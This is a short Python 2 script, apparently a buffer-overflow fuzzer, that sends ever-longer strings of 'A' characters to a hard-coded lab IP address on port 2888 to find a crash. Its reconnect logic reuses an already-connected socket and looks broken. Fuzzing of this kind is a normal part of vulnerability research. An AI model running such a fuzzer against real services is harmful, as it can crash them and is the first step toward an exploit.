import socket


targetIP="192.168.88.133"
port=2888
scket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
scket.connect((targetIP,port))
print "Connected to server"
scket.recv(1024)

msg="ABCDEFGHIJ"*10
count=1
increment=100;
while True:
    msg=msg + "A"*count*increment + "\r\n";
    print "Sending data of size: "+str(len(msg))+"  bytes"
    scket.send(msg)
    scket.recv(1024)
    count+=1

    if count%3 == 0:
        scket.connect((targetIP,port))
        scket.recv(1024)
        print "Connected to server"
